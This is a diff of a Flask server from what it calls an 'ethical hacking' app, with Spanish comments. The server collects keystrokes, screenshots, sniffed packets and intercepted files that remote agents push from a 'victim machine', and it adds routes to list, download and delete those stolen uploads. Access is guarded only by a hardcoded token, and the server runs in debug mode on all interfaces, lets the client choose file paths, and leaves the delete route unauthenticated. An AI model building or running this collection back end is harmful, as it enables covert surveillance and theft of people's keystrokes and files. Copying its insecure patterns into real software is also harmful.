@@ -3,7 +3,11 @@ Aplicación de Hacking Ético - Ciberseguridad
 Servidor Flask principal con endpoints para escaneo de puertos, generación de contraseñas, sniffing y keylogger.
 """
 
-from flask import Flask, render_template, request, jsonify
+from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
+import io
+import os
+import json
+from datetime import datetime
 from scanner import scan_single_port, scan_port_range, scan_all_ports
 from password_generator import generate_passwords
 from sniffer import sniffer
@@ -11,32 +15,32 @@ from keylogger import keylogger
 
 app = Flask(__name__)
 
+# ── Carpeta de uploads de arch.py (máquina víctima) ───────────────────────────
+BASE_DIR = os.path.abspath(os.path.dirname(__file__))
+UPLOADS_FOLDER = os.path.join(BASE_DIR, 'uploads')
+os.makedirs(UPLOADS_FOLDER, exist_ok=True)
+
 # ── Token de seguridad compartido con remote_agent.py ────────────────────────
-# Cambia este valor si quieres más seguridad.
-# Debe coincidir con el --token que se le pasa a remote_agent.py.
 AGENT_TOKEN = 'CIBER2026'
 
 
 @app.route('/')
 def index():
-    """Página principal de la aplicación."""
     return render_template('index.html')
 
 
 @app.route('/scan', methods=['POST'])
 def scan():
-    """Endpoint para escaneo de puertos lógicos."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
+
     host = data.get('host', '').strip()
     scan_type = data.get('scan_type', '')
-    
+
     if not host:
         return jsonify({'success': False, 'error': 'Debe indicar una dirección IP o hostname.'}), 400
-    
+
     try:
         if scan_type == 'single':
             port = data.get('port')
@@ -46,26 +50,25 @@ def scan():
             if port < 1 or port > 65535:
                 return jsonify({'success': False, 'error': 'El puerto debe estar entre 1 y 65535.'}), 400
             result = scan_single_port(host, port)
-            
+
         elif scan_type == 'range':
             start_port = data.get('start_port')
             end_port = data.get('end_port')
             if not start_port or not end_port:
                 return jsonify({'success': False, 'error': 'Debe indicar el rango de puertos.'}), 400
-            start_port = int(start_port)
-            end_port = int(end_port)
+            start_port, end_port = int(start_port), int(end_port)
             if start_port < 1 or end_port > 65535 or start_port > end_port:
                 return jsonify({'success': False, 'error': 'Rango de puertos inválido (1-65535).'}), 400
             result = scan_port_range(host, start_port, end_port)
-            
+
         elif scan_type == 'all':
             result = scan_all_ports(host)
-            
+
         else:
             return jsonify({'success': False, 'error': 'Tipo de escaneo no válido.'}), 400
-        
+
         return jsonify(result)
-        
+
     except ValueError:
         return jsonify({'success': False, 'error': 'Los puertos deben ser números enteros.'}), 400
     except Exception as e:
@@ -74,45 +77,37 @@ def scan():
 
 @app.route('/generate-passwords', methods=['POST'])
 def gen_passwords():
-    """Endpoint para generación de contraseñas seguras."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
     try:
         length = int(data.get('length', 0))
         count = int(data.get('count', 0))
     except (ValueError, TypeError):
         return jsonify({'success': False, 'error': 'La longitud y cantidad deben ser números enteros.'}), 400
-    
-    result = generate_passwords(length, count)
-    return jsonify(result)
+    return jsonify(generate_passwords(length, count))
 
 
 @app.route('/sniff', methods=['POST'])
 def sniff_network():
-    """Endpoint para captura de tráfico de red (sniffing)."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
     try:
         count = int(data.get('count', 50))
         filter_protocol = data.get('filter', 'all')
         interface = data.get('interface', None)
-        
+
         if filter_protocol not in ['all', 'tcp', 'udp', 'icmp']:
             return jsonify({'success': False, 'error': 'Filtro no válido. Use: all, tcp, udp, icmp'}), 400
-        
+
         result = sniffer.start_capture(
             count=count,
             filter_protocol=filter_protocol,
             interface=interface if interface else None
         )
         return jsonify(result)
-        
+
     except ValueError:
         return jsonify({'success': False, 'error': 'La cantidad debe ser un número entero.'}), 400
     except Exception as e:
@@ -121,50 +116,85 @@ def sniff_network():
 
 @app.route('/save-capture', methods=['POST'])
 def save_capture():
-    """Endpoint para guardar la captura en un archivo."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
+
     filepath = data.get('filepath', '').strip()
     packets = data.get('packets', [])
-    
+
     if not filepath:
         return jsonify({'success': False, 'error': 'Debe indicar la ruta del archivo.'}), 400
-    
     if not packets:
         return jsonify({'success': False, 'error': 'No hay paquetes para guardar.'}), 400
-    
-    # Agregar extensión .json si no la tiene
     if not filepath.endswith('.json'):
         filepath += '.json'
-    
-    result = sniffer.save_capture(filepath, packets)
-    return jsonify(result)
 
+    return jsonify(sniffer.save_capture(filepath, packets))
+
+
+@app.route('/download-capture', methods=['POST'])
+def download_capture():
+    """
+    Genera el JSON de captura en memoria y lo devuelve como descarga al navegador.
+    No escribe nada en disco del servidor.
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
+
+    packets = data.get('packets', [])
+    if not packets:
+        return jsonify({'success': False, 'error': 'No hay paquetes para descargar.'}), 400
+
+    json_str = sniffer.get_capture_json(packets)
+    filename = f'captura_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
+
+    return send_file(
+        io.BytesIO(json_str.encode('utf-8')),
+        mimetype='application/json',
+        as_attachment=True,
+        download_name=filename
+    )
+
+
+# ── NUEVO: Descarga de archivos interceptados ─────────────────────────────────
+
+@app.route('/download-intercepted/<int:file_index>', methods=['GET'])
+def download_intercepted(file_index):
+    """
+    Descarga un archivo interceptado durante el sniffing HTTP.
+    file_index: posición del archivo en la lista intercepted_files.
+    """
+    file_bytes = sniffer.get_intercepted_file_bytes(file_index)
+    file_info = sniffer.get_intercepted_file_info(file_index)
+
+    if file_bytes is None or file_info is None:
+        return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404
+
+    return send_file(
+        io.BytesIO(file_bytes),
+        mimetype=file_info.get('content_type', 'application/octet-stream'),
+        as_attachment=True,
+        download_name=file_info['filename']
+    )
+
+
+# ── Keylogger ─────────────────────────────────────────────────────────────────
 
 @app.route('/keylogger-start', methods=['POST'])
 def keylogger_start():
-    """Endpoint para iniciar el keylogger educativo."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
     try:
         duration = int(data.get('duration', 10))
         screenshot_interval = int(data.get('screenshot_interval', 5))
-
         if duration < 1 or duration > 30:
             return jsonify({'success': False, 'error': 'La duración debe ser entre 1 y 30 segundos.'}), 400
-
         if screenshot_interval < 0:
             screenshot_interval = 0
-
-        result = keylogger.start(duration=duration, screenshot_interval=screenshot_interval)
-        return jsonify(result)
-        
+        return jsonify(keylogger.start(duration=duration, screenshot_interval=screenshot_interval))
     except ValueError:
         return jsonify({'success': False, 'error': 'La duración debe ser un número entero.'}), 400
     except Exception as e:
@@ -173,19 +203,15 @@ def keylogger_start():
 
 @app.route('/keylogger-stop', methods=['POST'])
 def keylogger_stop():
-    """Endpoint para detener el keylogger."""
-    result = keylogger.stop()
-    return jsonify(result)
+    return jsonify(keylogger.stop())
 
 
 @app.route('/save-keylog', methods=['POST'])
 def save_keylog():
-    """Endpoint para guardar el registro de teclas en un archivo."""
     data = request.get_json()
-    
     if not data:
         return jsonify({'success': False, 'error': 'No se recibieron datos.'}), 400
-    
+
     filepath = data.get('filepath', '').strip()
     keys = data.get('keys', [])
     captured_text = data.get('captured_text', '')
@@ -193,43 +219,22 @@ def save_keylog():
 
     if not filepath:
         return jsonify({'success': False, 'error': 'Debe indicar la ruta del archivo.'}), 400
-
     if not keys:
         return jsonify({'success': False, 'error': 'No hay teclas para guardar.'}), 400
-
     if not filepath.endswith('.json'):
         filepath += '.json'
 
-    result = keylogger.save_log(filepath, keys, captured_text, screenshots=screenshots)
-    return jsonify(result)
+    return jsonify(keylogger.save_log(filepath, keys, captured_text, screenshots=screenshots))
 
 
-if __name__ == '__main__':
-    print("\n" + "=" * 60)
-    print("  🔒 Aplicación de Hacking Ético - Ciberseguridad")
-    print("  📡 Scanner | 🔑 Passwords | 🕵️ Sniffer | ⌨️ Keylogger")
-    print("=" * 60)
-    print("  Servidor corriendo en: http://127.0.0.1:5000")
-    print(f"  Token del agente remoto: CIBER2026")
-    print("=" * 60 + "\n")
-    app.run(debug=True, host='0.0.0.0', port=5000)
-
-
-# ────────────────────────────────────────────────────────────
-# ENDPOINTS DEL AGENTE REMOTO (remote_agent.py)
-# ────────────────────────────────────────────────────────────
+# ── Agente Remoto ─────────────────────────────────────────────────────────────
 
 def _check_token(data: dict) -> bool:
-    """Valida el token del agente."""
     return data.get('agent_token') == AGENT_TOKEN
 
 
 @app.route('/agent/register', methods=['POST'])
 def agent_register():
-    """
-    El agente remoto se registra aquí antes de empezar a enviar datos.
-    Limpia cualquier captura previa del modo correspondiente.
-    """
     data = request.get_json()
     if not data or not _check_token(data):
         return jsonify({'success': False, 'error': 'Token inválido o no autorizado.'}), 403
@@ -257,9 +262,6 @@ def agent_register():
 
 @app.route('/agent/push-packets', methods=['POST'])
 def agent_push_packets():
-    """
-    El agente remoto (modo sniffer) envía paquetes capturados en lotes.
-    """
     data = request.get_json()
     if not data or not _check_token(data):
         return jsonify({'success': False, 'error': 'Token inválido.'}), 403
@@ -270,15 +272,11 @@ def agent_push_packets():
     if not isinstance(packets, list):
         return jsonify({'success': False, 'error': 'Formato de paquetes inválido.'}), 400
 
-    result = sniffer.receive_remote_packets(packets, final=final)
-    return jsonify(result)
+    return jsonify(sniffer.receive_remote_packets(packets, final=final))
 
 
 @app.route('/agent/push-keys', methods=['POST'])
 def agent_push_keys():
-    """
-    El agente remoto (modo keylogger) envía teclas capturadas en lotes.
-    """
     data = request.get_json()
     if not data or not _check_token(data):
         return jsonify({'success': False, 'error': 'Token inválido.'}), 403
@@ -290,42 +288,88 @@ def agent_push_keys():
     if not isinstance(keys, list):
         return jsonify({'success': False, 'error': 'Formato de teclas inválido.'}), 400
 
-    result = keylogger.receive_remote_keys(keys, screenshots=screenshots, final=final)
-    return jsonify(result)
+    return jsonify(keylogger.receive_remote_keys(keys, screenshots=screenshots, final=final))
 
 
 @app.route('/agent/results/sniffer', methods=['GET'])
 def agent_results_sniffer():
-    """
-    El frontend hace polling a este endpoint para obtener los paquetes
-    remotos acumulados en tiempo real.
-    """
-    result = sniffer.get_remote_results()
-    return jsonify(result)
+    return jsonify(sniffer.get_remote_results())
 
 
 @app.route('/agent/results/keylogger', methods=['GET'])
 def agent_results_keylogger():
-    """
-    El frontend hace polling a este endpoint para obtener las teclas
-    remotas acumuladas en tiempo real.
-    """
-    result = keylogger.get_remote_results()
-    return jsonify(result)
+    return jsonify(keylogger.get_remote_results())
 
 
 @app.route('/agent/status', methods=['GET'])
 def agent_status():
-    """Estado rápido de los agentes conectados (para depuración)."""
-    sniffer_info = sniffer._remote_agent_info
-    keylogger_info = keylogger._remote_agent_info
     return jsonify({
         'success': True,
-        'sniffer_agent': sniffer_info or None,
+        'sniffer_agent': sniffer._remote_agent_info or None,
         'sniffer_packets': len(sniffer._remote_packets),
+        'sniffer_files': len(sniffer._remote_files),
         'sniffer_complete': sniffer._remote_complete,
-        'keylogger_agent': keylogger_info or None,
+        'keylogger_agent': keylogger._remote_agent_info or None,
         'keylogger_keys': len(keylogger._remote_keys),
         'keylogger_screenshots': len(keylogger._remote_screenshots),
         'keylogger_complete': keylogger._remote_complete,
     })
+
+
+# ── Servidor de Archivos — Máquina Víctima (arch.py) ─────────────────────────
+
+@app.route('/arch/files', methods=['GET'])
+def arch_list_files():
+    """Lista los archivos que la máquina víctima ha subido via arch.py."""
+    try:
+        files = []
+        for name in os.listdir(UPLOADS_FOLDER):
+            path = os.path.join(UPLOADS_FOLDER, name)
+            if os.path.isfile(path):
+                stat = os.stat(path)
+                ext = name.rsplit('.', 1)[-1].lower() if '.' in name else ''
+                from sniffer import _guess_content_type
+                files.append({
+                    'name': name,
+                    'size': stat.st_size,
+                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
+                    'content_type': _guess_content_type(name),
+                    'ext': ext,
+                })
+        files.sort(key=lambda f: f['modified'], reverse=True)
+        return jsonify({'success': True, 'files': files, 'total': len(files)})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+@app.route('/arch/download/<path:filename>', methods=['GET'])
+def arch_download_file(filename):
+    """Descarga un archivo subido por la máquina víctima."""
+    try:
+        return send_from_directory(UPLOADS_FOLDER, filename, as_attachment=True)
+    except FileNotFoundError:
+        return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404
+
+
+@app.route('/arch/delete/<path:filename>', methods=['DELETE'])
+def arch_delete_file(filename):
+    """Elimina un archivo subido por la máquina víctima."""
+    try:
+        path = os.path.join(UPLOADS_FOLDER, filename)
+        if not os.path.isfile(path):
+            return jsonify({'success': False, 'error': 'Archivo no encontrado.'}), 404
+        os.remove(path)
+        return jsonify({'success': True, 'message': f'{filename} eliminado.'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+
+if __name__ == '__main__':
+    print("\n" + "=" * 60)
+    print("  🔒 Aplicación de Hacking Ético - Ciberseguridad")
+    print("  📡 Scanner | 🔑 Passwords | 🕵️ Sniffer | ⌨️ Keylogger")
+    print("=" * 60)
+    print("  Servidor corriendo en: http://127.0.0.1:5000")
+    print(f"  Token del agente remoto: {AGENT_TOKEN}")
+    print("=" * 60 + "\n")
+    app.run(debug=True, host='0.0.0.0', port=5000)
